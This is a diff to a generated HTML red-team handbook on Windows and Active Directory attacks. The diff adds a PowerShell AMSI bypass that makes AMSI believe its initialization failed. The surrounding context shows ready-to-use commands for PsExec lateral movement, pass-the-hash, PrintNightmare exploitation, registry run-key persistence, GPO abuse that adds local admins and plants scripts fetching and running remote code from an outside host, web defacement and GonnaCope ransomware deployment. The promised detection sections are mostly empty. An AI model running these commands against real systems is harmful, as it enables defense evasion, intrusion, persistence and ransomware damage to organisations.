@@ -547,6 +547,17 @@ foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*Context'){$c=
 <p><img src="./images/Pasted%20image%2020230707132744.png" alt="Bypass AMSI" /></p>
 <h4 id="indicators-of-compromise-12"><a class="header" href="#indicators-of-compromise-12">Indicators of Compromise</a></h4>
 <p>TODO</p>
+<h3 id="method-2---telling-amsi-that-init-failed"><a class="header" href="#method-2---telling-amsi-that-init-failed">Method 2 - Telling AMSI that init Failed</a></h3>
+<p>Similar to method 1, only powershell is needed for this technique. Instead of corrupting the AMSI context pointer, it's possible to convince AMSI that it's initialization failed.</p>
+<p>Use the following powershell to bypass AMSI:</p>
+<pre><code class="language-powershell">foreach($x in [Ref].Assembly.GetTypes()){if($x.Name -like '*iUtils'){$a=$x}}
+foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*iInitFailed'){$i=$x}}
+$i.SetValue($null, $true)
+</code></pre>
+<p>Now the 'amsiutils' test string should not trigger defender:</p>
+<p>![[Pasted image 20230707133543.png]]</p>
+<h4 id="indicators-of-compromise-13"><a class="header" href="#indicators-of-compromise-13">Indicators of Compromise</a></h4>
+<p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="windows-stealth"><a class="header" href="#windows-stealth">Windows Stealth</a></h1>
 <ul>
 <li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
@@ -579,7 +590,7 @@ net group &quot;Enterprise Admins&quot; kevin.beacon /add /domain
 <p>From a Windows client, the <a href="https://learn.microsoft.com/en-us/sysinternals/">Sysinternals</a> suite can be used to execute arbitrary programs on the target machine. Use <code>-s</code> to run the command as NT AUTHORITY\SYSTEM, and use <code>-i</code> to make it interactive, though this will almost certainly break in a reverse shell. Though, using this flag also gives some useful output even when spawning a reverse shell through PsExec, which is why it is listed below.</p>
 <pre><code class="language-cmd">.\psexec.exe -accepteula -u user -p password -s -i \\remote.server.com cmd /c %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -enc &lt;base64 encoded cradle&gt;
 </code></pre>
-<h4 id="indicators-of-compromise-13"><a class="header" href="#indicators-of-compromise-13">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-14"><a class="header" href="#indicators-of-compromise-14">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-2---manually-psexecing-with-sc"><a class="header" href="#method-2---manually-psexecing-with-sc">Method 2 - Manually PsExecing with SC</a></h3>
 <p>From a Windows client, upload the binary you wish to execute on the target and start a remote service with the following commands (there is supposed to be a space after binPath):</p>
@@ -587,7 +598,7 @@ net group &quot;Enterprise Admins&quot; kevin.beacon /add /domain
 sc \\remote.server.com create servicename binPath= &quot;C:\Windows\payload.exe&quot;
 sc \\remote.server.com start servicename
 </code></pre>
-<h4 id="indicators-of-compromise-14"><a class="header" href="#indicators-of-compromise-14">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-15"><a class="header" href="#indicators-of-compromise-15">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-3---impacket-psexec"><a class="header" href="#method-3---impacket-psexec">Method 3 - Impacket-PsExec</a></h3>
 <p>The impacket library was created in python, so as long as python and impacket are installed, this should work from any OS that supports python.</p>
@@ -596,7 +607,7 @@ sc \\remote.server.com start servicename
 <p>If you do not have or know the password, but you do have the NTLM hash, then impacket also supports Pass The Hash (Only place the part of the hash after the colon in this command):</p>
 <pre><code class="language-bash">impacket-psexec -hashes :NTHASH DOMAIN/USERNAME@target
 </code></pre>
-<h4 id="indicators-of-compromise-15"><a class="header" href="#indicators-of-compromise-15">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-16"><a class="header" href="#indicators-of-compromise-16">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="mof-upload"><a class="header" href="#mof-upload">MOF Upload</a></h1>
 <h2 id="summary-9"><a class="header" href="#summary-9">Summary</a></h2>
@@ -674,7 +685,7 @@ instance of MyClass89 as $MyClass
 };
 </code></pre>
 <p>Once this file is uploaded, then the exe that was uploaded should get executed.</p>
-<h4 id="indicators-of-compromise-16"><a class="header" href="#indicators-of-compromise-16">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-17"><a class="header" href="#indicators-of-compromise-17">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="winrm"><a class="header" href="#winrm">WinRM</a></h1>
 <h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
@@ -692,7 +703,7 @@ instance of MyClass89 as $MyClass
 <p><code>evil-winrm --ip &lt;target&gt; --user &lt;user&gt; --password &lt;password&gt;</code></p>
 <p>Connect to a host, passing the hash instead of using a password:</p>
 <p><code>evil-winrm --ip &lt;target&gt; --user &lt;user&gt; --hash &lt;nt_hash&gt;</code></p>
-<h4 id="indicators-of-compromise-17"><a class="header" href="#indicators-of-compromise-17">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-18"><a class="header" href="#indicators-of-compromise-18">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="printnightmare-cve-2021-1675"><a class="header" href="#printnightmare-cve-2021-1675">PrintNightmare (CVE-2021-1675)</a></h1>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
@@ -715,7 +726,7 @@ HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoEl
 <pre><code class="language-bash">python3 CVE-2021-1675.py domain.com/username:'password'@target-ip '\\your-ip\share\your.dll'
 </code></pre>
 <p><img src="./images/Pasted%20image%2020230606100148.png" alt="successful connection" /></p>
-<h4 id="indicators-of-compromise-18"><a class="header" href="#indicators-of-compromise-18">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-19"><a class="header" href="#indicators-of-compromise-19">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="windows-persistence"><a class="header" href="#windows-persistence">Windows Persistence</a></h1>
 <ul>
@@ -765,7 +776,7 @@ Examples:
 <p>Or for a specific user:</p>
 <pre><code class="language-cmd">.\invisreg.exe create HKCU:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ &quot;powershell -enc &lt;base64&gt;&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-19"><a class="header" href="#indicators-of-compromise-19">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-20"><a class="header" href="#indicators-of-compromise-20">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory"><a class="header" href="#active-directory">Active Directory</a></h1>
 <ul>
@@ -797,7 +808,7 @@ Examples:
 <p>This command will add the &quot;SeTakeOwnership&quot; and &quot;SeRemoteInteractiveLogonRight&quot; privileges to the bob.smith user account. </p>
 <pre><code>SharpGPOAbuse.exe --AddUserRights --UserRights &quot;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&quot; --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-20"><a class="header" href="#indicators-of-compromise-20">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-21"><a class="header" href="#indicators-of-compromise-21">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-2---addlocaladmin"><a class="header" href="#method-2---addlocaladmin">Method 2 - AddLocalAdmin</a></h3>
 <p>The following are the available options to add a local admin via GPO:</p>
@@ -810,7 +821,7 @@ Examples:
 <p>The following will create a new local administrator account named &quot;bob.smith&quot;:</p>
 <pre><code>SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-21"><a class="header" href="#indicators-of-compromise-21">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-22"><a class="header" href="#indicators-of-compromise-22">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-3---adduserscript--addcomputerscript"><a class="header" href="#method-3---adduserscript--addcomputerscript">Method 3 - AddUserScript / AddComputerScript</a></h3>
 <p>The following are the available options to add a user or computer script via GPO:</p>
@@ -825,7 +836,7 @@ Examples:
 <p>The following will add a user script, this syntax also works with &quot;--AddComputerScript&quot;:</p>
 <pre><code>SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-22"><a class="header" href="#indicators-of-compromise-22">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-23"><a class="header" href="#indicators-of-compromise-23">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-4---addusertask--addcomputertask"><a class="header" href="#method-4---addusertask--addcomputertask">Method 4 - AddUserTask / AddComputerTask</a></h3>
 <p>The following are the available options to add a user or computer task via GPO:</p>
@@ -859,7 +870,7 @@ Additional Computer Task Options:
 <p>The following will add a user task, this syntax also works with &quot;--AddComputerTask&quot;:</p>
 <pre><code>SharpGPOAbuse.exe --AddUserTask --TaskName &quot;Update&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-23"><a class="header" href="#indicators-of-compromise-23">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-24"><a class="header" href="#indicators-of-compromise-24">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <h3 id="method-5---addregistrykey"><a class="header" href="#method-5---addregistrykey">Method 5 - AddRegistryKey</a></h3>
 <p>The following are the available options to add a registry key via GPO:</p>
@@ -881,7 +892,7 @@ Additional Computer Task Options:
 <p>The following will add a registry key:</p>
 <pre><code>SharpGPOAbuse.exe --AddRegistryKey --Hive HKLM --KeyPath &quot;Software\Policies\Microsoft\Windows\Installer&quot; --KeyName AlwaysInstallElevated --KeyType REG_DWORD --KeyData 1 --GPOName &quot;Vulnerable GPO&quot;
 </code></pre>
-<h4 id="indicators-of-compromise-24"><a class="header" href="#indicators-of-compromise-24">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-25"><a class="header" href="#indicators-of-compromise-25">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-vulnerabilities"><a class="header" href="#active-directory-vulnerabilities">Active Directory Vulnerabilities</a></h1>
 <ul>
@@ -912,7 +923,7 @@ Additional Computer Task Options:
 <p><img src="./images/Pasted%20image%2020230629110911.png" alt="image" /></p>
 <pre><code class="language-bash">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
 </code></pre>
-<h4 id="indicators-of-compromise-25"><a class="header" href="#indicators-of-compromise-25">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-26"><a class="header" href="#indicators-of-compromise-26">Indicators of Compromise</a></h4>
 <p>TODO</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="impact"><a class="header" href="#impact">Impact</a></h1>
 <ul>
@@ -932,7 +943,7 @@ Additional Computer Task Options:
 <pre><code class="language-bash">cd /var/www/html # Most common webroot location
 unzip /path/to/papa_www.zip
 </code></pre>
-<h4 id="indicators-of-compromise-26"><a class="header" href="#indicators-of-compromise-26">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-27"><a class="header" href="#indicators-of-compromise-27">Indicators of Compromise</a></h4>
 <p>TODO, but its going to be loud and obvious</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="gonnacope"><a class="header" href="#gonnacope">GonnaCope</a></h1>
 <h2 id="summary-16"><a class="header" href="#summary-16">Summary</a></h2>
@@ -952,7 +963,7 @@ Place the ransomware onto the system via download or GPO.</p>
 </code></pre>
 <p>OR</p>
 <p>Navigate to the directory of the ransomware and double click the <code>G0nnaC0pe.bat</code> file.</p>
-<h4 id="indicators-of-compromise-27"><a class="header" href="#indicators-of-compromise-27">Indicators of Compromise</a></h4>
+<h4 id="indicators-of-compromise-28"><a class="header" href="#indicators-of-compromise-28">Indicators of Compromise</a></h4>
 <ul>
 <li>
 <p>The ransomware encrypts files found and adds a &quot;.cope&quot; extension to the filename.</p>
